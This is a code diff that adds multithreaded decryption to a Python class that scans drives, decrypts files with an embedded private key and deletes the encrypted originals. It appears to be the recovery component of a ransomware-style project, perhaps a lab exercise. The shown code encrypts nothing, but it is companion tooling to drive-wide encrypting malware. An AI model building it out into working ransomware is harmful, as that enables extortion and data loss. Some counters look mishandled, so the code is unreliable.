@@ -15,6 +15,7 @@ class Decryptor:
         self.private_key = private_key
         self.drives = []
         self.filepaths = []
+        self.decrypted_count = 0
 
     def scan_drives(self):
         """
@@ -106,7 +107,7 @@ class Decryptor:
         
         return iv, key
 
-    def decrypt(self, files_list=[]):
+    def decrypt(self, files_list):
         """
         The encrypt function called by threading.
         """
@@ -157,9 +158,40 @@ class Decryptor:
 
                 #remove encrypted file
                 os.remove(filepath)
+
+                self.decrypted_count += 1
     
             except Exception as e:
                 print(f"[LOG] error: {e}")
+                self.fail_count += 1
+
+    def start_decryption_process(self, threads=3):
+        """
+        a function which starts a thread for encrytion, it will spaw multiple threads
+        """
+        #split list by amount of threads
+        avg_len = len(self.filepaths) // threads   # Average size of each chunk
+        remainder = len(self.filepaths) % threads   # Remainder to distribute across parts
+
+        result = []  # List to hold the resulting parts
+        start = 0  # Start index for each split
+        
+        for i in range(threads):
+            # Calculate end index for each part
+            end = start + avg_len + (1 if i < remainder else 0)
+            result.append(self.filepaths[start:end])  # Append the split list to result
+            start = end  # Update start index for next chunk
+        print(result)
+        start_time = time.time()
+
+        #verwerk decryptie met een thread pool
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            for files in result:
+                executor.submit(self.decrypt, files)
+
+        end_time = time.time()
+
+        print(f"[LOG] {(self.decrypted_count/len(self.filepaths))*100}% files decrypted, time elapsed: {end_time-start_time}s")
 
 if __name__ == "__main__":
     
@@ -183,6 +215,6 @@ rIm8EArVVAlDeDOVgjgKxdnMbgB9wnvB+kjxhjJrcZBbZOtR
 
     decrypt.scan_drives()
     decrypt.get_files()
-    decrypt.decrypt()
+    decrypt.start_decryption_process()
 
 
